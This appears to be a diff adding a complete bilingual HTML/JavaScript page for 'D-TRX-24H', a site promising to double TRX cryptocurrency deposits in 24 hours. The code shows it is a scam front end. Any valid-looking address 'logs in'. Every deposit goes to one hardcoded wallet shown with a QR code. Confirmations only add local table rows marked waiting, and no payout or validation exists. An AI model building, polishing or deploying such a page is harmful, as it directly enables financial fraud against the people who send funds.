@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>D-TRX-24H | Login & Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      min-height: 100vh;
+      color: white;
+      position: relative;
+    }
+    .lang-menu {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      z-index: 20;
+    }
+    .lang-menu select {
+      padding: 6px;
+      border-radius: 6px;
+      border: none;
+      font-weight: bold;
+    }
+    .center-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .login-box, .dashboard-box {
+      background: rgba(255,255,255,0.07);
+      padding: clamp(10px, 4vw, 30px) clamp(6px, 3vw, 26px);
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.45);
+      text-align: center;
+      width: 98vw;
+      max-width: 400px;
+      margin: 0 auto;
+      transition: opacity 0.4s, transform 0.4s;
+      box-sizing: border-box;
+      overflow-x: auto;
+    }
+    .login-box {
+      min-height: 330px;
+      margin-top: 40px;
+    }
+    h1 {
+      font-size: clamp(1.5em, 4vw, 2.3em);
+      margin-bottom: 10px;
+      background: linear-gradient(90deg, #ffcc00, #ff0066);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: pulse 2s infinite;
+      text-shadow: 0 0 10px rgba(255,255,255,0.3);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1);}
+      50% {transform: scale(1.05);}
+      100% {transform: scale(1);}
+    }
+    input, select {
+      width: 100%;
+      padding: clamp(8px, 2vw, 14px);
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: clamp(1em, 2vw, 1.1em);
+      transition: box-shadow 0.3s;
+      box-sizing: border-box;
+      overflow-x: auto;
+      max-width: 100%;
+    }
+    .feedback {
+      font-weight: bold;
+      margin-bottom: 10px;
+      min-height: 20px;
+      font-size: clamp(0.95em,2vw,1.08em);
+      word-break: break-all;
+    }
+    .btn {
+      background: yellow;
+      color: black;
+      padding: clamp(10px, 2vw, 14px);
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 5px;
+      font-size: clamp(1em,2vw,1.1em);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .spinner {
+      margin: 15px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #fff;
+      border-top: 4px solid red;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .dashboard-box {
+      display: none;
+      animation: fadeIn 0.7s;
+    }
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(40px);}
+      100% { opacity: 1; transform: none;}
+    }
+    .dashboard-nav {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+      gap: 9px;
+      flex-wrap: wrap;
+      width: 100%;
+    }
+    .dashboard-nav button {
+      flex: 1 1 45%;
+      background: #ffcc00;
+      color: #222;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      padding: clamp(7px,1.5vw,11px) 0;
+      margin-bottom: 8px;
+      box-shadow: 0 1px 8px rgba(255,255,255,0.08);
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+      font-size: clamp(1em,2vw,1.1em);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .dashboard-nav button.active, .dashboard-nav button:hover {
+      background: #ff0066;
+      color: #fff;
+    }
+    .dashboard-content {
+      background: rgba(255,255,255,0.11);
+      border-radius: 10px;
+      margin-top: 9px;
+      padding: clamp(12px,3vw,18px) clamp(5px,2vw,12px) 8px clamp(5px,2vw,12px);
+      min-height: 124px;
+      text-align: left;
+      color: #fff;
+      box-shadow: 0 0 8px 1px rgba(0,0,0,0.07);
+      box-sizing: border-box;
+      overflow-x: auto;
+      font-size: clamp(1em,2vw,1.08em);
+    }
+    .dashboard-header {
+      font-size: clamp(1.1em,2.8vw,1.23em);
+      font-weight: bold;
+      margin-bottom: 6px;
+      letter-spacing: 0.02em;
+      color: #ffcc00;
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .logout-link {
+      color: #ff0066;
+      background: none;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: underline;
+      margin-top: 10px;
+      font-size: clamp(1em,2vw,1.08em);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .double24h {
+      font-size: clamp(1.03em,2.2vw,1.15em);
+      color: #00e676;
+      margin-bottom: 8px;
+      font-weight: bold;
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .trx-balance {
+      font-size: clamp(1em,2vw,1.1em);
+      color: #fff;
+      margin-bottom: 12px;
+      font-weight: bold;
+      text-shadow: 0 1px 4px #0006;
+    }
+    .trx-amount {
+      color: #ffcc00;
+      font-size: clamp(1.3em,3vw,1.5em);
+      font-weight: bold;
+      margin-bottom: 6px;
+      display: block;
+    }
+    .hide {
+      display: none !important;
+    }
+    .deposit-address-box {
+      display: inline-block;
+      background: #0d47a1;
+      color: #fff;
+      border-radius: 14px;
+      padding: clamp(12px,2vw,18px) clamp(7px,2vw,24px);
+      margin: clamp(11px,2vw,18px) 0 clamp(13px,2vw,20px) 0;
+      font-weight: bold;
+      letter-spacing: 1px;
+      font-size: clamp(1em,2.5vw,1.17em);
+      word-break: keep-all;
+      white-space: nowrap;
+      text-align: center;
+      border: 2.5px solid #42a5f5;
+      box-shadow: 0 2px 20px #1565c0cc, 0 0 20px #42a5f540;
+      animation: addr-vibrate 1s linear infinite;
+      user-select: all;
+      overflow-x: auto;
+      max-width: 100%;
+      width: auto;
+    }
+    @keyframes addr-vibrate {
+      0% { transform: translateX(0);}
+      10% { transform: translateX(-2px);}
+      20% { transform: translateX(2px);}
+      30% { transform: translateX(-2px);}
+      40% { transform: translateX(2px);}
+      50% { transform: translateX(0);}
+      100% { transform: translateX(0);}
+    }
+    .success-message {
+      background: #1ed760;
+      color: #fff;
+      border-radius: 8px;
+      padding: 10px;
+      margin: 12px 0;
+      font-weight: bold;
+      text-align: center;
+      animation: fadeInMsg 1s;
+      font-size: clamp(1em,2vw,1.08em);
+    }
+    .deposit-qr {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 12px 0 8px 0;
+    }
+    .deposit-qr img {
+      background: #fff;
+      border-radius: 8px;
+      width: clamp(90px,28vw,140px);
+      height: clamp(90px,28vw,140px);
+      margin-bottom: 6px;
+      box-shadow: 0 2px 10px #0003;
+    }
+    .step {
+      margin-bottom: 18px;
+      text-align: center;
+      overflow-x: auto;
+      font-size: clamp(1em,2vw,1.08em);
+    }
+    .step-title {
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #ffcc00;
+      font-size: clamp(1em,2vw,1.07em);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .step-desc {
+      font-size: clamp(0.95em,1.8vw,1em);
+      margin-bottom: 5px;
+      color: #fff;
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .step-btn {
+      background: #ffcc00;
+      color: #222;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      padding: clamp(8px,2vw,10px) 0;
+      width: 100%;
+      margin-top: 5px;
+      margin-bottom: 5px;
+      cursor: pointer;
+      font-size: clamp(1em,2vw,1.03em);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    .statut-waiting {
+      color: #f7b731;
+      font-weight: bold;
+      font-size: clamp(1em,2vw,1.08em);
+    }
+    @keyframes fadeInMsg {
+      0% { opacity: 0; transform: translateY(-10px);}
+      100% { opacity: 1; transform: none;}
+    }
+    table {
+      font-size: clamp(0.98em,2vw,1em);
+      width: 100%;
+      box-sizing: border-box;
+      overflow-x: auto;
+      table-layout: auto;
+      word-break: break-all;
+    }
+    th, td {
+      padding: clamp(2px,1vw,6px) clamp(2px,1vw,4px);
+      overflow-wrap: break-word;
+      word-break: break-all;
+    }
+    @media (max-width: 600px) {
+      .login-box, .dashboard-box {
+        padding: clamp(8px,3vw,18px) clamp(2px,1vw,7px);
+        max-width: 100vw;
+      }
+      .dashboard-content {
+        padding: clamp(6px,2vw,12px) clamp(2px,1vw,7px) 7px clamp(2px,1vw,7px);
+      }
+      .deposit-address-box {
+        font-size: clamp(0.9em,3vw,1em);
+        padding: clamp(7px,2vw,13px) clamp(3px,1vw,9px);
+        min-width: 0;
+        max-width: 99vw;
+        overflow-x: auto;
+      }
+      table {
+        font-size: clamp(0.93em,2vw,0.98em);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="lang-menu">
+    <select id="langSelect">
+      <option value="en">English</option>
+      <option value="fr">Français</option>
+    </select>
+  </div>
+
+  <div class="center-container">
+    <!-- Login -->
+    <div class="login-box" id="loginBox">
+      <h1 id="title">D-TRX-24H</h1>
+      <input type="text" id="walletInput" placeholder="Enter your TRX address">
+      <div class="feedback" id="feedbackText">Waiting for input...</div>
+      <div class="spinner" id="spinner"></div>
+      <button class="btn" id="accessBtn">Access</button>
+    </div>
+    <!-- Dashboard -->
+    <div class="dashboard-box" id="dashboardBox">
+      <h1 id="dashboardTitle">D-TRX-24H</h1>
+      <div class="dashboard-nav" id="dashboardNav">
+        <button class="active" data-tab="deposit" id="tabDeposit"></button>
+        <button data-tab="transaction" id="tabTransaction"></button>
+        <button data-tab="affiliation" id="tabAffiliation"></button>
+        <button data-tab="about" id="tabAbout"></button>
+      </div>
+      <div class="dashboard-content" id="dashboardContent"></div>
+      <button class="logout-link" id="logoutBtn"></button>
+    </div>
+  </div>
+
+  <script>
+    // Unique deposit address
+    const DEPOSIT_ADDRESS = "TGUUdvn3QYJG4EY9dVLaCyNGZsX29Jwqvg";
+    function getQrUrl(addr) {
+      return "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(addr);
+    }
+
+    // Language texts
+    const texts = {
+      en: {
+        title: "D-TRX-24H",
+        loginPlaceholder: "Enter your TRX address",
+        waiting: "Waiting for input...",
+        valid: "✅ Valid TRON Address",
+        invalid: "❌ Invalid Address",
+        loading: "⏳ Loading...",
+        access: "Access",
+        granted: "✅ Access Granted",
+        deposit: "Deposit",
+        transaction: "Transaction",
+        affiliation: "Affiliation",
+        about: "About",
+        logout: "Logout",
+        double24h: "Your deposit is doubled in 24 hours!",
+        makeDepositBtn: "Make a deposit",
+        chooseAmount: "Choose the amount you want to deposit (TRX):<br><span style='color:#ff0066;font-size:1em;'><b>Minimum deposit: 7 TRX</b></span>",
+        minDepositError: "❌ Minimum deposit is 7 TRX",
+        next: "Next",
+        confirmTitle: "Confirmation",
+        confirmDesc: "Please send the amount below to the deposit address. You have 20 minutes to complete the transfer.",
+        addressLabel: "Deposit address:",
+        copy: "Copy",
+        copied: "Copied!",
+        qrLabel: "Scan to pay",
+        confirmDepositBtn: "I have sent the deposit",
+        successDeposit: "Deposit recorded! Your deposit will be doubled within 24h (after validation).",
+        depositMsg: "Waiting for transfer validation...",
+        depositTableNo: "(No deposit yet)",
+        status_wait: "Waiting for transfer",
+        status_valid: "Validated",
+        status_returned: "Returned x2",
+        affiliationContent: `
+          <div class="dashboard-header">Affiliation</div>
+          <div>
+            Invite friends and earn doubled rewards!<br>
+            <b>Your referral link:</b> <span id="referralLink"></span>
+          </div>
+        `,
+        aboutContent: `
+          <div class="dashboard-header">About</div>
+          <div>
+            D-TRX-24H is a secure platform to double your TRX deposit in 24 hours.<br>
+            <b>How it works?</b> Deposit any amount of TRX and receive double after 24 hours.<br>
+            <small>Version 1.0.</small>
+          </div>
+        `
+      },
+      fr: {
+        title: "D-TRX-24H",
+        loginPlaceholder: "Entrez votre adresse TRX",
+        waiting: "En attente de saisie...",
+        valid: "✅ Adresse TRON valide",
+        invalid: "❌ Adresse invalide",
+        loading: "⏳ Chargement...",
+        access: "Accéder",
+        granted: "✅ Accès autorisé",
+        deposit: "Dépôt",
+        transaction: "Transaction",
+        affiliation: "Affiliation",
+        about: "À propos",
+        logout: "Déconnexion",
+        double24h: "Votre dépôt est doublé en 24h !",
+        makeDepositBtn: "Faire un dépôt",
+        chooseAmount: "Choisissez le montant à déposer (TRX) :<br><span style='color:#ff0066;font-size:1em;'><b>Dépôt minimum : 7 TRX</b></span>",
+        minDepositError: "❌ Le dépôt minimum est de 7 TRX",
+        next: "Suivant",
+        confirmTitle: "Confirmation",
+        confirmDesc: "Veuillez envoyer le montant ci-dessous à l'adresse de dépôt. Vous avez 20 minutes pour effectuer le transfert.",
+        addressLabel: "Adresse de dépôt :",
+        copy: "Copier",
+        copied: "Copié !",
+        qrLabel: "Scannez pour payer",
+        confirmDepositBtn: "J'ai envoyé le dépôt",
+        successDeposit: "Dépôt enregistré ! Votre dépôt sera doublé sous 24h (après validation).",
+        depositMsg: "En attente de validation du transfert...",
+        depositTableNo: "(Aucun dépôt)",
+        status_wait: "En attente de transfert",
+        status_valid: "Validé",
+        status_returned: "Rendu x2",
+        affiliationContent: `
+          <div class="dashboard-header">Affiliation</div>
+          <div>
+            Invitez vos amis et gagnez des récompenses doublées !<br>
+            <b>Votre lien de parrainage :</b> <span id="referralLink"></span>
+          </div>
+        `,
+        aboutContent: `
+          <div class="dashboard-header">À propos</div>
+          <div>
+            D-TRX-24H est une plateforme sécurisée pour doubler vos dépôts TRX en 24h.<br>
+            <b>Comment ça marche ?</b> Déposez le montant de votre choix et recevez le double après 24h.<br>
+            <small>Version 1.0.</small>
+          </div>
+        `
+      }
+    };
+
+    // References
+    const input = document.getElementById('walletInput');
+    const feedback = document.getElementById('feedbackText');
+    const spinner = document.getElementById('spinner');
+    const button = document.getElementById('accessBtn');
+    const langSelect = document.getElementById('langSelect');
+    const title = document.getElementById('title');
+    const loginBox = document.getElementById('loginBox');
+    const dashboardBox = document.getElementById('dashboardBox');
+    const dashboardTitle = document.getElementById('dashboardTitle');
+    const dashboardNav = document.getElementById('dashboardNav');
+    const dashboardContent = document.getElementById('dashboardContent');
+    const logoutBtn = document.getElementById('logoutBtn');
+
+    // State
+    let currentLang = langSelect.value;
+    let currentWallet = "";
+    let deposits = [];
+    let lastDepositMsgTimeout = null;
+
+    // Utility
+    function updateTexts() {
+      title.textContent = texts[currentLang].title;
+      dashboardTitle.textContent = texts[currentLang].title;
+      input.placeholder = texts[currentLang].loginPlaceholder;
+      button.textContent = texts[currentLang].access;
+      feedback.textContent = texts[currentLang].waiting;
+      dashboardNav.querySelector('[data-tab="deposit"]').textContent = texts[currentLang].deposit;
+      dashboardNav.querySelector('[data-tab="transaction"]').textContent = texts[currentLang].transaction;
+      dashboardNav.querySelector('[data-tab="affiliation"]').textContent = texts[currentLang].affiliation;
+      dashboardNav.querySelector('[data-tab="about"]').textContent = texts[currentLang].about;
+      logoutBtn.textContent = texts[currentLang].logout;
+    }
+    updateTexts();
+
+    // Wallet validation
+    input.addEventListener('input', () => {
+      const val = input.value.trim();
+      let valid = /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(val);
+
+      if (valid) {
+        feedback.textContent = texts[currentLang].valid;
+        feedback.style.color = 'red';
+        input.style.boxShadow = '0 0 10px red';
+      } else {
+        feedback.textContent = texts[currentLang].invalid;
+        feedback.style.color = 'gray';
+        input.style.boxShadow = '0 0 10px gray';
+      }
+    });
+
+    // Login
+    button.addEventListener('click', () => {
+      const val = input.value.trim();
+      if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(val)) {
+        spinner.style.display = 'block';
+        feedback.textContent = texts[currentLang].loading;
+        button.disabled = true;
+        setTimeout(() => {
+          spinner.style.display = 'none';
+          feedback.textContent = texts[currentLang].granted;
+          button.disabled = false;
+          setTimeout(() => {
+            loginBox.style.display = 'none';
+            dashboardBox.style.display = 'block';
+            currentWallet = val;
+            deposits = [];
+            showDashboardTab('deposit');
+          }, 600);
+        }, 1200);
+      } else {
+        feedback.textContent = texts[currentLang].invalid;
+      }
+    });
+
+    // Language change
+    langSelect.addEventListener('change', () => {
+      currentLang = langSelect.value;
+      updateTexts();
+      if (loginBox.style.display !== 'none') {
+        feedback.textContent = texts[currentLang].waiting;
+      }
+      if (dashboardBox.style.display === 'block') {
+        let active = dashboardNav.querySelector('button.active');
+        if (active) showDashboardTab(active.dataset.tab);
+      }
+    });
+
+    // Dashboard navigation
+    dashboardNav.addEventListener('click', (e) => {
+      if (e.target.tagName === 'BUTTON') {
+        showDashboardTab(e.target.dataset.tab);
+      }
+    });
+
+    function showDashboardTab(tab) {
+      dashboardNav.querySelectorAll('button').forEach(btn => btn.classList.remove('active'));
+      let btn = dashboardNav.querySelector(`button[data-tab="${tab}"]`);
+      if (btn) btn.classList.add('active');
+      let html = "";
+      if (tab === "deposit") {
+        html = `
+          <div class="dashboard-header">${texts[currentLang].deposit}</div>
+          <div class="double24h">${texts[currentLang].double24h}</div>
+          <div id="depositSection"></div>
+        `;
+        setTimeout(renderDepositSection, 0);
+      }
+      else if (tab === "transaction") {
+        html = renderTransactionContent();
+      }
+      else if (tab === "affiliation") html = texts[currentLang].affiliationContent;
+      else if (tab === "about") html = texts[currentLang].aboutContent;
+      dashboardContent.innerHTML = html;
+      // Insert referral info
+      if (dashboardContent.querySelector('#referralLink')) {
+        dashboardContent.querySelector('#referralLink').textContent =
+          window.location.origin + window.location.pathname + '?ref=' + currentWallet;
+      }
+    }
+
+    // Deposit Section: stepper logic
+    function renderDepositSection() {
+      let section = dashboardContent.querySelector('#depositSection');
+      if (!section) return;
+      // Success message if just deposited
+      if (window.__showDepositSuccessMsg) {
+        let msg = `<div class="success-message">${texts[currentLang].successDeposit}<br>${texts[currentLang].depositMsg}</div>`;
+        section.insertAdjacentHTML('beforeend', msg);
+        window.__showDepositSuccessMsg = false;
+        if (lastDepositMsgTimeout) clearTimeout(lastDepositMsgTimeout);
+        lastDepositMsgTimeout = setTimeout(() => {
+          let msgDiv = section.querySelector('.success-message');
+          if (msgDiv) msgDiv.remove();
+        }, 7000);
+      }
+      // Step 1: choose amount (if not in the middle of confirming)
+      if (!window.__stepDepositAmount) {
+        section.innerHTML = `
+          <div class="step">
+            <div class="step-title">${texts[currentLang].chooseAmount}</div>
+            <input type="number" min="7" id="stepAmountInput" placeholder="TRX" style="max-width:180px;text-align:center;">
+            <div id="minDepositError" style="color:#ff0066;font-weight:bold;min-height:22px;"></div>
+            <button class="step-btn" id="stepAmountNext">${texts[currentLang].next}</button>
+          </div>
+          ${renderDepositHistoryTable()}
+        `;
+        document.getElementById('stepAmountNext').onclick = function() {
+          let val = Number(document.getElementById('stepAmountInput').value);
+          let minDeposit = 7;
+          let errorDiv = document.getElementById('minDepositError');
+          if (!val || val < minDeposit) {
+            document.getElementById('stepAmountInput').style.boxShadow = '0 0 7px #ff0066';
+            errorDiv.textContent = texts[currentLang].minDepositError;
+          } else {
+            errorDiv.textContent = "";
+            window.__stepDepositAmount = val;
+            renderDepositConfirmStep();
+          }
+        };
+        renderDepositHistory();
+      } else {
+        renderDepositConfirmStep();
+      }
+    }
+
+    function renderDepositConfirmStep() {
+      let section = dashboardContent.querySelector('#depositSection');
+      if (!section) return;
+      let amount = window.__stepDepositAmount;
+      section.innerHTML = `
+        <div class="step">
+          <div class="step-title">${texts[currentLang].confirmTitle}</div>
+          <div class="step-desc">${texts[currentLang].confirmDesc}</div>
+          <div style="margin:12px 0 7px 0;font-size:1.15em;font-weight:bold;">
+            ${amount} TRX
+          </div>
+          <div style="width:100%;display:flex;justify-content:center;align-items:center;overflow-x:auto;">
+            <span class="deposit-address-box" title="Deposit Address">${DEPOSIT_ADDRESS}</span>
+          </div>
+          <div class="deposit-qr">
+            <img src="${getQrUrl(DEPOSIT_ADDRESS)}" alt="QR Code">
+            <span style="font-size:0.95em;color:#ffcc00;">${texts[currentLang].qrLabel}</span>
+          </div>
+          <button class="step-btn" id="stepConfirmDeposit" style="margin-top:10px;">${texts[currentLang].confirmDepositBtn}</button>
+        </div>
+        ${renderDepositHistoryTable()}
+      `;
+      document.getElementById('stepConfirmDeposit').onclick = function() {
+        let now = new Date();
+        let dateStr = now.toLocaleDateString(currentLang === 'fr' ? 'fr-FR' : 'en-US');
+        let timeStr = now.toLocaleTimeString(currentLang === 'fr' ? 'fr-FR' : 'en-US', {hour12:false});
+        deposits.unshift({
+          date: dateStr,
+          hour: timeStr,
+          amount: amount,
+          status: texts[currentLang].status_wait // Not validated yet
+        });
+        window.__showDepositSuccessMsg = true;
+        window.__stepDepositAmount = null;
+        showDashboardTab('deposit');
+      };
+      renderDepositHistory();
+    }
+
+    function renderDepositHistoryTable() {
+      return `
+        <div style="margin-top:24px;overflow-x:auto;">
+        <table style="width:100%;background:none;color:#fff;min-width:340px;">
+          <thead>
+            <tr style="color:#ffcc00">
+              <th style="text-align:left;">${currentLang === 'fr' ? 'Date' : 'Date'}</th>
+              <th style="text-align:left;">${currentLang === 'fr' ? 'Heure' : 'Hour'}</th>
+              <th style="text-align:right;">${currentLang === 'fr' ? 'Montant' : 'Amount'}</th>
+              <th style="text-align:right;">${currentLang === 'fr' ? 'Statut' : 'Status'}</th>
+            </tr>
+          </thead>
+          <tbody id="depositHistory">
+            <tr><td colspan="4" style="text-align:center;color:#fff9;">${texts[currentLang].depositTableNo}</td></tr>
+          </tbody>
+        </table>
+        </div>
+      `;
+    }
+
+    function renderDepositHistory() {
+      let arr = deposits.slice();
+      let tbody = dashboardContent.querySelector('#depositHistory');
+      if (!tbody) return;
+      if (arr.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:#fff9;">${texts[currentLang].depositTableNo}</td></tr>`;
+        return;
+      }
+      tbody.innerHTML = arr.map(depo => 
+        `<tr>
+          <td>${depo.date}</td>
+          <td>${depo.hour}</td>
+          <td style="text-align:right;">${depo.amount} TRX</td>
+          <td style="text-align:right;">
+            ${depo.status === texts[currentLang].status_wait
+                ? `<span class="statut-waiting">${depo.status}</span>`
+                : depo.status}
+          </td>
+        </tr>`
+      ).join('');
+    }
+
+    function renderTransactionContent() {
+      let html = `
+        <div class="dashboard-header">${texts[currentLang].transaction}</div>
+        <table style="width:100%;background:none;color:#fff;min-width:340px;">
+          <thead>
+            <tr style="color:#ffcc00">
+              <th style="text-align:left;">${currentLang === 'fr' ? 'Date' : 'Date'}</th>
+              <th style="text-align:left;">${currentLang === 'fr' ? 'Heure' : 'Hour'}</th>
+              <th style="text-align:right;">${currentLang === 'fr' ? 'Montant' : 'Amount'}</th>
+              <th style="text-align:right;">${currentLang === 'fr' ? 'Statut' : 'Status'}</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${
+              deposits.length === 0 ?
+                `<tr><td colspan="4" style="text-align:center;color:#fff9;">${texts[currentLang].depositTableNo}</td></tr>` :
+                deposits.map(depo =>
+                  `<tr>
+                    <td>${depo.date}</td>
+                    <td>${depo.hour}</td>
+                    <td style="text-align:right;">${depo.amount} TRX</td>
+                    <td style="text-align:right;">
+                      ${depo.status === texts[currentLang].status_wait
+                        ? `<span class="statut-waiting">${depo.status}</span>`
+                        : depo.status}
+                    </td>
+                  </tr>`
+                ).join('')
+            }
+          </tbody>
+        </table>
+      `;
+      return html;
+    }
+
+    // Logout
+    logoutBtn.addEventListener('click', () => {
+      dashboardBox.style.display = 'none';
+      loginBox.style.display = '';
+      input.value = '';
+      feedback.textContent = texts[currentLang].waiting;
+      input.style.boxShadow = '';
+      currentWallet = "";
+      deposits = [];
+      window.__stepDepositAmount = null;
+    });
+
+    window.onload = () => { input.focus(); }
+  </script>
+</body>
+</html>
